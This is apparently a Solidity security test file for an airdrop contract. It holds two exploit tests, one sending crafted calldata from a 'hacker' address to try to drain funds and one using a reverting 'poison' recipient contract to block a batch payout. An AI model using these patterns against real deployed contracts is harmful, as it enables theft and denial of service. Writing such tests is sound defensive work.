// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "contracts/SoulCodeAirdrop.sol";

interface IVm {
    function prank(address sender) external;
    function deal(address account, uint256 newBalance) external;
}

contract PoisonContract {
    receive() external payable {
        revert("I am a malicious contract!");
    }
}

contract SoulCodeAirdropTest {
    SoulCodeAirdrop airdrop;
    IVm constant vm = IVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    
    address public owner;
    address public hacker = address(0xBADBEEF);
    address public user1 = address(0x1111);
    address public user2 = address(0x2222);

    function setUp() public {
        owner = address(this);
        airdrop = new SoulCodeAirdrop();
    }

    function test_Exploit_HackerCanStealFunds() public {
        vm.deal(address(airdrop), 5 ether);
        
        address[] memory recipients = new address[](1);
        recipients[0] = hacker;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2 ether;

        bytes memory flatCalldata = abi.encodePacked(uint256(1));
        flatCalldata = abi.encodePacked(flatCalldata, uint256(uint160(recipients[0])), amounts[0]);

        vm.prank(hacker);
        (bool success, ) = address(airdrop).call{value: 0}(flatCalldata);
        
        if (success) {
            revert("CRITICAL VULNERABILITY: Hacker successfully drained contract funds!");
        }
    }

    function test_Exploit_DOS_Via_PoisonContract() public {
        PoisonContract poison = new PoisonContract();
        
        address[] memory recipients = new address[](3);
        recipients[0] = user1;
        recipients[1] = address(poison);
        recipients[2] = user2;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;

        bytes memory flatCalldata = abi.encodePacked(uint256(3));
        for (uint256 i = 0; i < 3; i++) {
            flatCalldata = abi.encodePacked(flatCalldata, uint256(uint160(recipients[i])), amounts[i]);
        }

        vm.deal(address(this), 3 ether);
        (bool success, ) = address(airdrop).call{value: 3 ether}(flatCalldata);
        
        if (!success) {
            // DOS зафіксовано успішно
        } else {
            revert("Unexpected success: DOS architecture failed?");
        }
    }
}
